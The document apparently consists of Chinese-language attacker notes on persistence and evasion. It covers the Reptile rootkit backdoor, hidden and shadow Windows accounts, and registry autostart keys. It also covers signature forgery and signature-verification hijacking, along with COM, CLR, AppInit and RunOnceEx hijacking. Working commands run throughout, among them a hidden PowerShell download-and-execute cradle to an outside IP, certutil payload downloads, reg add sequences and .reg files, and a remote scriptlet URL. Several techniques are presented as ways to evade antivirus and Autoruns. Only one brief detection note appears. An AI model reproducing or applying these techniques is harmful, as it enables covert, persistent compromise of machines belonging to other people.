**\#1). rootkit:**

**LKM Linux rootkit:Reptile https://github.com/f0rb1dd3n/Reptile**

目标机器:

apt install build-essential libncurses-dev linux-headers-\$(uname -r) && make
config

![](media/1aa8ed94386b68b1d65b9972c3662b60.png)

![](media/8d6887bc791431856cdb4db71fde2f9a.png)

![](media/4cbbca37dd7b50f3c31cbce5976bd2ec.png)

Reptile's Backdoor

The backdoor is a reverse shell triggered by a magic packet sent via TCP, UDP or
ICMP protocol. It will call a binary in userland which will connect, trigger
Reptile's hidding commands and provide you a reverse shell with some nice
features like:

>   File uploader and downloader

>   Possibility to set a delay to connect back in a period of time (in seconds)

>   Full TTY shell (like ssh)

控制端:

![](media/d630881e22d20c08ac5c1d7a60acb972.png)

![](media/d17c3beba45c172fb5c856bd4d160b7b.png)

There are another two binaries: listener and packet. The client binary will
handle listener and packet but you can use them separately if you want

shell

The shell is easy to use, when you got a connection just type help to see the
commands.

It already hide its process and connection.

Its connection is encrypted

There is a file uploader and file downloader inside.

You can set a delay to receive a reverse connection every time you want.

If you run shell you will get a full TTY/PTY shell like ssh.

![](media/7b057ae488081d49ccc4d1050718def5.png)

![](media/b125cbfc628e2377f76897572dc84acf.png)

**\#2). Windows利用注册表权限维持:**

**Windows隐藏账户**

![](media/5fd46faeafe844fa6ef9856a3b3e883a.png)

![](media/59f8ed5ba1be99a5a3048bf2bb53a1fb.png)

![](media/c98dcd5900dcc99727317b709d0f3554.png)

![](media/0a5e46d83b85741b6efe945f8d8f06a1.png)

![](media/86df080e7fb1acc5d5544c1266eaf833.png)

![](media/4a7918e409aab245487ffc4183ac728e.png)

![](media/a929036b168d0b81dec647bb6cab569e.png)

![](media/887354c4624a99fdb7966b736b508f0b.png)

![](media/7735928689d6ac01f6788c132a000f4e.png)

![](media/4d9fd75d27973091b489900a281671df.png)

![](media/2133469b4dedcaddeeee58573a2842a3.png)

![](media/728d336f882db1a17bc35833c0cada89.png)

![](media/554fd59efda8463ab5cad35937a0b519.png)

![](media/c76c45cb337448e186b5a873980309af.png)

![](media/0581f33a73f4ccdc070e0006ac1217a2.png)

![](media/32e78f13662a766801d620be7d3c19c3.png)

![](media/516a39500e83e55df9c787e39537d5cb.png)

![](media/936ca5d90e0d97b637125dce9f2bd650.png)

![](media/55cc478a9cc74284d816afcb719085ee.png)

![](media/acb0a69126b02cf3065d9f89ee09afdd.png)

![](media/ad9bfaec921cac867f1c414ac715b357.png)

![](media/9b51ecc420ec3e37fc19621189b948d3.png)

![](media/fe23cb7d8f7d87b5a99ac57e0bccd01f.png)

![](media/79f0eef02a1d55fd8125426953f29415.png)

可以正常本地登录但无管理员权限

**影子账户**

![](media/b4e5c1d828bf77e266eb6b19cb7308e0.png)

![](media/4fe03e495bed647a844159a4839ca382.png)

![](media/c60934122a75a44ecf07bb781944d66e.png)

![](media/712b5dc12979e1777349084453a11fb5.png)

命令行中删除hidden\$并导入.reg文件

![](media/1cc916a93a2e4f0da06acbcd5671ba0c.png)

![](media/3c6448a0c54fb720da8e41d0e95977bd.png)

![](media/6229b62aa55f61c32fd2f58ebc274f19.png)

![](media/4763d12ffee8f0ebd69329afa87e13fb.png)

可本地和RDP登录且拥有管理员权限且其他用户(包括管理员)在命令行下无法查到此账户

仅hidden\$账户本身在命令行下可通过net localgroup
administrators查看到hidden\$的存在

测试发现:

hidden\$账户和本地administrator账户登入系统后为同一个账户(取决于谁先登录)

若administrator用户先登录，则命令行下无法查看到hidden\$账户

若hidden\$用户先登录，则命令行下可查看到hidden\$账户

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维-BootExecute密钥**

启动注册表项:

HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce

HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce

HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer

HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run:

![](media/e2c9c7f48165ab47e1e5dad44aa0f763.png)

![](media/bd210953f45a3187bc0be35ee6cbadc5.png)

cmd.exe /c powershell.exe -nop -w hidden -c "\$l=new-object
net.webclient;\$l.proxy=[Net.WebRequest]::GetSystemWebProxy();\$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX
\$l.downloadstring('http://10.95.14.216:8080/MWzJkHqxQmTmol');"

user1用户登录:

![](media/6854327a7777db6806f7f24ac03e3848.png)

administrator用户登录:

![](media/64d2f5633b8919e504001d81c2b71d4a.png)

通过BootExecute来实现启动Native程序，Native程序在驱动程序和系统核心加载后将被加载，此时会话管理器(smss.exe)进行windowsNT用户模式并开始按顺序启动native程序

SMSS.EXE会话管理器调用配置子系统:

HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\hivelist

HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Session Manager\\BootExecute

用于系统启动时的自检，启动项里的程序在系统图形化界面完成前就已经被执行，具有很高的优先级

http://hex.pp.ua/files/nativeshell_0.12.rar

![](media/3914342a09d90a9877935492d75bafe9.png)

![](media/b3c61047e9c8bf2d6fd852d86e947cbb.png)

add.reg:

REGEDIT4

[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager]

"BootExecute"=hex(7):61,75,74,6f,63,68,65,63,6b,20,61,75,74,6f,63,68,6b,20,2a,\\

00,6e,61,74,69,76,65,20,48,65,6c,6c,6f,20,57,6f,72,6c,64,21,00,00

install.cmd:

\@echo off

copy native.exe %systemroot%\\system32\\.

regedit /s add.reg

echo Native Example Installed

pause

![](media/e1b54e33a8bd901bf8ff29283f44a358.png)

![](media/cde406d98e616e6002271b34cc719a33.png)

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维-用户名密钥**

userinit注册表键:

用户进行登录时WinLogon进程加载的指定的登陆脚本

![](media/da2d49e22daa49ded73da243d00773b2.png)

该键的值中可以使用逗号分隔开多个程序

![](media/6f5ef7d15342bb399c76581cd77301b0.png)

注意字符转义

![](media/249859b59a4f709c6f89e62870f66df3.png)

![](media/9b24e3d48618ebde7a164cf1b59b2e95.png)

user1用户登录:

![](media/da3d5104de9093bbf5eb4fe4b1ba595d.png)

administrator用户登录:

![](media/362636f7823fc1d71335e7108e04eb4d.png)

![](media/497988b5b28edea7241279f241e95f6f.png)

反弹shell的权限取决于当前登录的用户，注销会丢失shell，重新登录后重新获取shell，切换用户不会丢失shell，切换用户并登录其他用户会获得该用户新shell，之前的用户shell依然正常

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维-LogonScripts键**

LogonScripts能优先于杀软运行(适用于单个当前用户，所以尽量搞管理员维持高权限)

![](media/10d21743f8d21037a8b73ffc5ff9c3d0.png)

![](media/39d4b66e4a6bb6220beb5fd15dfc2605.png)

user1用户登录:

![](media/8f9aaf0df9786e645f56a2896d7cc610.png)

administrator用户:

![](media/08e05c6f131f4edab0219ac7c3e38133.png)

![](media/2df8b147b16fcb6b8657fbe86e4fd14a.png)

![](media/afd587e9ff0dba2fdae17dc32b56d44a.png)

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维-启动密钥**

User Shell Folders优先于Shell Folders

![](media/af8ecd3cf3eb331515b841d3a1d6c7f1.png)

![](media/b41d40ba1a8df0473a52bbd1b83c5a7b.png)

![](media/c64837999bfc3bc86fa5ed9707b59419.png)

![](media/8b2fab963997f4c979f01e8dbdd31b78.png)

![](media/dd3ccd69909895c66ae4d29ffa714be1.png)

user1用户登录:

![](media/2170d0630bc4c8dd6f6745a440884869.png)

![](media/84e5e30fb6db8cf226a681c3288d03d5.png)

重新登录:

![](media/1a004bd680c1327f7586671eb3c988f7.png)

administrator用户登录:

![](media/ba321e45d593f497e7e78e0ef06961c2.png)

![](media/de76b4b8bd91342188dcacf3690ce0ec.png)

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维-浏览器辅助对象**

IE启动时加载的DLL模块 https://github.com/liigo/bho

![](media/3ccdc70aec074991eba4effb0a4ca446.png)

![](media/61a27bd6eecc8792491d5c88cd7f2979.png)

![](media/b88bd205f2c50926fdf6f2ad41d35dda.png)

将数字签名添加在文件末尾的方法(Authenticode):

![](media/091edbb2ed796322bbe2ead8094a05c7.png)

powershell验证数字签名:

![](media/b73e5dcc6988edbde71e73c2d37cd2bd.png)

signtool.exe验证数字签名:

![](media/01517e98054da5b630d302ca86fa989a.png)

![](media/5ffc2993d131a53140f730d7db2cc3dd.png)

sigcheck.exe验证数字签名:

![](media/fd7db2da0714181e67b59f8d77039653.png)

![](media/114d957cd0587b32b5fa84875ecf24fb.png)

生成测试证书:

![](media/fda6e109832cf21f75460376721d3c23.png)

![](media/27cb29dc05d2f015726a980a6032ef3e.png)

![](media/16aab6a5555378c3a0147e08d76d6e2b.png)

![](media/c04e76409a4bf55a9645d1f306a779ff.png)

![](media/f660a690393100417017ece3ad935320.png)

将数字签名保存在CAT文件中的方法(catalog):

Windows系统中，有些文件通过文件属性无法获得其数字签名信息，但是这些文件也包含数字签名，这里的数字签名指的就是CAT(安全编录)文件数字签名(catalog
signing)

C:\\Windows\\System32\\catroot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}

![](media/2cc6fde09b35d007bdcdcf27d1885a91.png)

通过文件属性无法查看CAT数字签名.cat文件保存格式为ASN.1标准，直接通过记事本无法查看，需要解密，https://lapo.it/asn1js/

![](media/118620a2d2e494c4c6b465c292c3084e.png)

C:\\Windows\\System32\\xwizard.exe
自带CAT格式的数字签名，通过文件属性无法查看CAT数字签名

![](media/bf60b96808fcc00ff7eedad30a3ce2ff.png)

powershell无法获得CAT文件数字签名:

![](media/ec559b99f2f8496bd5f8df63b8cffdd0.png)

Win10系统能够获取CAT文件数字签名

Win7系统不能获取CAT文件数字签名

可以使用signtool.exe和sigcheck.exe查看数字签名

![](media/761b031caa851b74478f0f82af5b4a32.png)

![](media/24004ffd61f2db22e2a90f7ec47d896c.png)

使用CAT文件数字签名

1.生成CAT文件

![](media/15203797ddf38622be95f5d7fb6f47ba.png)

![](media/fe2f1d8b35dff11fb7f970d769af4857.png)

2.使用证书为CAT文件添加签名

![](media/73b0390dc8ea3c07ca71ee59d8a4d4c1.png)

3.将cat文件添加到系统的安全编录数据库

![](media/7583ed121770d14f69dedd5337bdf31c.png)

添加到系统的安全编录数据库相当于在目录C:\\Windows\\System32\\catroot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}添加文件makecat1.cat

![](media/ce285e5d8be0f548500b51a2e97bfbbf.png)

![](media/9aba157ab6528e3d1c271a803c43d422.png)

移动位置后，CAT文件数字签名不会失效

![](media/54b449d60ec7516b66914e348955b658.png)

PE文件的签名伪造

CFF Explorer获取文件结构

![](media/e2f50d1463dab8d1a594cea3862597c0.png)

Security Directory RVA代表数字签名在PE文件中的偏移位置

Security Directory Size代表数字签名的长度

将这部分内容提取，复制到另一个文件test.exe的尾部，同时使用CFF
Explorer修改test.exe对应的Security Directory RVA和Security
DirectorySize实现数字签名的伪造

https://github.com/secretsquirrel/SigThief

将consent.exe的数字签名复制到compromise.exe中

![](media/92f78231534e73d33a276aa24ce7a487.png)

![](media/daa4a371325f52581d156dd473917789.png)

![](media/8b1e89c238fe6ac1f6dd6824160eff83.png)

![](media/9f9432cd35378385312f1580e3a0ea91.png)

![](media/91d2cc384e49354e05f3ef79da1ba372.png)

win7:

![](media/e2fc9baa08640f2bf5149b91ed088296.png)

win10:

![](media/5b750743f6d1671ce504a1087b7886e8.png)

使用IDA打开该dll，查看函数DllRegisterServer()

![](media/22718f598010fa9f80d352d766d2f7b8.png)

该函数返回TRUE代表验证成功，返回FALSE代表验证失败

该功能对应注册表键值，位置如下：

HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType
0\\CryptSIPDllVerifyIndirectData\\

![](media/6d867074060fff4663706a649d878012.png)

不同GUID对应不同文件格式的验证，例如:

>   C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE

>   DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog .cat文件

>   9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL .ctl文件

>   C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet .cab文件

替换

HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType
0\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}

下的dll和FuncName

![](media/05c8de7c5350b5bddfd9bca52b57e077.png)

只要dll的导出函数返回TRUE，就能够绕过验证

所以查找系统默认的dll，找到一个导出函数返回true即可

![](media/8239e8dc7a3966fa6b9e4eefbe425747.png)

![](media/e6740011ff9b8f781711fe1775e5c400.png)

如果使用32位的程序，如32位的signtool和sigcheck，为了绕过验证，还需要修改32位的注册表键值:

![](media/5d16a184c28fc660c7a501a9b8661cde.png)

![](media/c77868fd4c86bbcfad1de14cf423533d.png)

![](media/862ad4edea1898a261b270f3615cd61f.png)

![](media/15bb3ea83930cec197e4c87c0ea396c0.png)

PE文件的签名验证劫持

![](media/4c66c58e6dc9f71b97eb1bfce17b8a97.png)

![](media/5f3e7e427f061e61ac40f064fbf6715c.png)

查看受系统保护的DLL:

![](media/dce4ad7086f39039f2215e635931b2c0.png)

![](media/07b83cb9b2cbfe56579ceaabbc55aeda.png)

**ATT&CK: Privilege
Persistence-2).Windows利用注册表权限维-AppInit_DLLs注册表项**

User32.dll被加载到进程时，会获取AppInit_DLLs注册表项，若有值，则调用LoadLibrary()
API加载用户DLL。只会影响加载了user32.dll的进程。User32.dll是一个非常常见的库，用于存储对话框等图形元素。

![](media/7f3850dd071a81540090d004cb84e8f1.png)

![](media/ecfc1671580449831732b62fad07a7a6.png)

![](media/0c991cfd08d7742c1ceadd05b5ab0def.png)

![](media/6d0f7c2e3c53d122ea23e3c380d5b322.png)

没有弹回shell

现在将LoadAppInit_DLLs键值从1改回0后，立刻弹回shell

![](media/68028ca06a1a39f1e7a7bc1f43559344.png)

![](media/496ce3418ae7eea6f4150399b32ea6d8.png)

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维-文件关联**

![](media/df1cbba0dc394980f330958587c494a1.png)

HKEY_CURRENT_USER\\Software\\Classe //保存了当前用户的类注册和文件扩展名信息

HKEY_LOCAL_MACHINE\\Software\\Classe
//保存了系统所有用户用户的类注册和文件扩展名信息

HKEY_CLASS_ROOT //HKEY_CLASSES_ROOT项提供合并来自上面两个的信息的注册表的视图

![](media/2001dab3b70362db7e6dfce36763b37c.png)

![](media/23e1caa0b108e552d39feb7f319f81b6.png)

![](media/cab23629d1c9dc328ed67e4db2855190.png)

![](media/6793dab8bdde115a02195a36f8179896.png)

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维-映像劫持**

![](media/a89ca92536bc1a30b0601a81bb97d8e3.png)

![](media/41bed3e29194d599e78da40a27f1892f.png)

![](media/586ab6683a9aff0f15283ef9e13dab1a.png)

![](media/184ecbd1a8bb2e7eb493627f5022e255.png)

![](media/f066f04dcdd33608df5fdc7891031938.png)

![](media/e2336e3c052a98ba8d433d46825750c9.png)

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维- COM Hijacking**

应用程序寻找过程:

1.HKCU\\Software\\Classes\\CLSID

2.HKCR\\CLSID

3.HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Objects\\

![](media/f9d8959f98859e69f438cdd8e1993e76.png)

![](media/f326a40fc95329fc53eff3f98a5b6023.png)

![](media/2363bbfb7354db272afe65e5d52e2ffc.png)

当进程寻找COM组件时，首先会寻找： HKCU\\Software\\Classes\\CLSID

我们直接在CLSID下新建一个对象ID，就能够劫持某个进程或多个进程。

evil.reg:

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}]

[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32]

\@="C:\\\\Temp\\\\calc.dll"

"ThreadingModel"="Apartment"

"LoadWithoutCOM"=""

[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\ShellFolder]

"HideOnDesktop"=""

"Attributes"=dword:f090013d

命令:

reg add
HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32
/v "" /t REG_SZ /d "C:\\Temp\\calc.dll" /f

reg add
HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32
/v "LoadWithoutCOM" /t REG_SZ /d "" /f

reg add
HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32
/v "ThreadingModel" /t REG_SZ /d "Apartment" /f

reg add
HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\ShellFolder
/v "HideOnDesktop" /t REG_SZ /d "" /f

reg add
HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\ShellFolder
/v "Attributes" /t REG_DWORD /d f090013d /f

eventvwr.exe将会寻找{0A29FF9E-7F9C-4437-8B11-F424491E3931}这个组件，而这个组件又需要加载InProcServer32指定的DLL，这个DLL的路径就是MSF上传的木马DLL。当DLL一旦加载到eventvwr.exe这个进程中，Windows会复制一个管理员的Access
Token给这个DLL创建的进程。

eventvwr.exe如果是被管理员组的用户打开，将会自动提升权限，Windows中会有很多这类的应用程序

![](media/e62035826eb65d371241f7ed04f19315.png)

![](media/189394712dd67feb34f4dec30a330b9a.png)

![](media/83a540f644b2eee8ebffd586d8a3b25f.png)

![](media/3817476265ea5c38493963264b332171.png)

![](media/05dda8881f103207e7e5b1f4ad8f32b6.png)

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维-CLR劫持**

CLR:(能够劫持所有.Net程序，系统默认会调用.net程序,导致后门自动触发)：

全称Common Language
Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。

CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行：

在CLR监视之下运行的程序属于“托管的”（managed）代码

不在CLR之下、直接在裸机上运行的应用或者组件属于“非托管的”（unmanaged）的代码

![](media/db99f0707623970086a33973f43fa2a3.png)

SET
KEY=HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{11111111-1111-1111-1111-111111111111}\\InProcServer32

REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\\msg.dll" /F

REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F

![](media/9a4c1df5a3c05d90e524f35213b3389b.png)

![](media/e9d6684487c895bfb2b997ed4c92665a.png)

![](media/56df69bbbd0ec6d84e8db7528f2bef53.png)

使用CLR能够劫持所有.Net程序的启动，但是只能作用于当前cmd

作用于全局(修改环境变量)

修改系统变量（需要管理员权限）：

wmic ENVIRONMENT create name="1",username="\<system\>",VariableValue="1"

修改当前用户变量（当前用户权限）：

wmic ENVIRONMENT create name="2",username="%username%",VariableValue="2"

需要系统重启或注销重新登录才能生效

![](media/80d6536408483d64fc6dd19e9d807686.png)

![](media/e67b975fa7c718d93e7bd6c3bdd785e4.png)

注销或重启后:

![](media/a3a2baa841a27e35da112b6b81a7a13b.png)

![](media/281af07c660b1241ef448d79c06b65e5.png)

完整POC:

wmic ENVIRONMENT create
name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"

wmic ENVIRONMENT create
name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"

certutil.exe -urlcache -split -f
https://raw.githubusercontent.com/3gstudent/test/master/msg.dll

certutil.exe -urlcache -split -f
https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete

certutil.exe -urlcache -split -f
https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll

certutil.exe -urlcache -split -f
https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete

SET
KEY=HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{11111111-1111-1111-1111-111111111111}\\InProcServer32

REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\\msg_x64.dll" /F

REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F

SET
KEY=HKEY_CURRENT_USER\\Software\\Classes\\WoW6432Node\\CLSID\\{11111111-1111-1111-1111-111111111111}\\InProcServer32

REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\\msg.dll" /F

REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F

https://raw.githubusercontent.com/3gstudent/test/master/msg.dll

https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll

![](media/d7507416163ad39d7306e6cb6f6e059d.png)

检测方法：

检查环境变量COR_ENABLE_PROFILING和COR_PROFILER

检查注册表键值HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\

补充:

powershell更改环境变量

New-ItemProperty "HKCU:\\Environment\\" COR_ENABLE_PROFILING -value "1"
-propertyType string \| Out-Null

New-ItemProperty "HKCU:\\Environment\\" COR_PROFILER -value
"{11111111-1111-1111-1111-111111111111}" -propertyType string \| Out-Null

注册表环境变量POC:

REG ADD
"HKCU\\Software\\Classes\\CLSID\\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\\InprocServer32"
/ve /t REG_EXPAND_SZ /d "C:\\test\\calc.dll" /f

REG ADD "HKCU\\Environment" /v "COR_PROFILER" /t REG_SZ /d
"{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f

REG ADD "HKCU\\Environment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f

mmc gpedit.msc

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维-
CAccPropServicesClass以及MMDeviceEnumerator劫持**

同使用CLR劫持.Net程序的方法类似，也是通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例，所以，这就可以用作后门来使用，并且，该方法也能够绕过Autoruns对启动项的检测。

dll命名规则

32位:api-ms-win-downlevel-1x86-l1-1-0._dl

64位:api-ms-win-downlevel-1x64-l1-1-0._dl

{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}对应CAccPropServicesClass

{BCDE0395-E52F-467C-8E3D-C4579291692E}对应MMDeviceEnumerator

64位及32位:

C:\\Users\\user1\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}

![](media/64ce89452e6d8d6054573be7c82044a3.png)

![](media/bdd0f2c2e5c6d1d4b05af2f4a2044a1d.png)

![](media/46c9ef3d7c7fc8114aaca50cd5c25835.png)

![](media/ae6cafe002691ad3d547d84476b66d6d.png)

![](media/c167123630faa0a73b4a8b798826d9f7.png)

![](media/83a0d22c7ddce9da20c8fe991053ae1e.png)

![](media/0f68531d60a6c6bdf05db38d98fd1e98.png)

自动化工具:

https://github.com/3gstudent/COM-Object-hijacking

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维-MruPidlList劫持**

在注册表位置为HKCU\\Software\\Classes\\CLSID\\下创建项{42aedc87-2188-41fd-b9a3-0c966feabec1}，再创建一个子项InprocServer32，默认的键值为我们的dll路径，再创建一个键ThreadingModel，其键值：Apartment

![](media/198352e020c882a6db2b1ff78be7bdca.png)

![](media/3e2bc08c731c8aa1bb18d61d4b7cab3d.png)

该注册表对应COM对象MruPidlList，作用于shell32.dll，而shell32.dll是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。其中explorer.exe会调用shell32.dll，然后会加载COM对象MruPidlList，从而触发我们的dll文件

重启或结束explorer.exe后新开启一个explorer.exe，恶意dll被加载

![](media/6af5201271f76bc2e2677bd7892d35d2.png)

![](media/825228f983471b83d0f9701f6d62204f.png)

![](media/b218719a2797573ba9c059c6a12ed594.png)

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维-winlogon COM劫持**

AtomicRedTeam.sct:

\<?XML version="1.0"?\>

\<scriptlet\>

\<registration

description="AtomicRedTeam"

progid="AtomicRedTeam"

version="1.00"

classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"

remotable="true"

\>

\</registration\>

\<script language="JScript"\>

\<![CDATA[

var r = new ActiveXObject("WScript.Shell").Run("calc.exe");

]]\>

\</script\>

\</scriptlet\>

COMHijack.reg:

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam.1.00]

\@="AtomicRedTeam"

[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam.1.00\\CLSID]

\@="{00000001-0000-0000-0000-0000FEEDACDC}"

[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam]

\@="AtomicRedTeam"

[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam\\CLSID]

\@="{00000001-0000-0000-0000-0000FEEDACDC}"

[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}]

\@="AtomicRedTeam"

[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32]

\@="C:\\\\WINDOWS\\\\system32\\\\scrobj.dll"

"ThreadingModel"="Apartment"

[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID]

\@="AtomicRedTeam.1.00"

[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL]

\@="http://10.95.14.216:8000/evil.sct"

[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID]

\@="AtomicRedTeam"

[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{06DA0625-9701-43DA-BFD7-FBEEA2180A1E}]

[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{06DA0625-9701-43DA-BFD7-FBEEA2180A1E}\\TreatAs]

\@="{00000001-0000-0000-0000-0000FEEDACDC}"

![](media/8d0000060cf127a0d8e0409df62adb93.png)

![](media/a0aef6f8016701099fe074c41e4a2e71.png)

重启机器:

![](media/7f4573f69a7e8a7ef49d45c48fbecc90.png)

![](media/c53430cbf86d8dae9b0464f2ac4b298c.png)

![](media/c825ce29b23b4df324cc56026e171c4f.png)

![](media/b4aa078c429dcc6cdc6ff4034c916e86.png)

![](media/233dbf8263bf30bbe69e39f35ca70156.png)

![](media/72de6573a12d0722e8f42d8e61e6be07.png)

**ATT&CK: Privilege Persistence-2).Windows利用注册表权限维- RunOnceEx权限维持**

可规避autoruns.exe的检测

调用恶意dll:

reg add
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1
/d "C:\\xx.dll"

![](media/302c0234cb35fd039beb80cbed2a8c72.png)

恶意dll将在下次登录时启动

![](media/e406d82e7c512e75d058924b7a7176c6.png)

或手动调用

![](media/9530fce0b74b9d27fc7cf41c7f9bddd2.png)

![](media/a64c8da52dafdb7bee72552ffa8f573c.png)

调用恶意exe:

![](media/48706f6e842b73909d507d3215bd81f9.png)

![](media/59f72be5799b7bf10a9482209726d7c6.png)

![](media/84a91c18001df1ab72b4cdff5e3ee34c.png)

dll和exe同时注册时只调用dll

exe被调用完后其注册表项(0001 /v "Line1" /t REG_SZ /d
"\|\|c:\\windows\\system32\\calc.exe")自动被清除
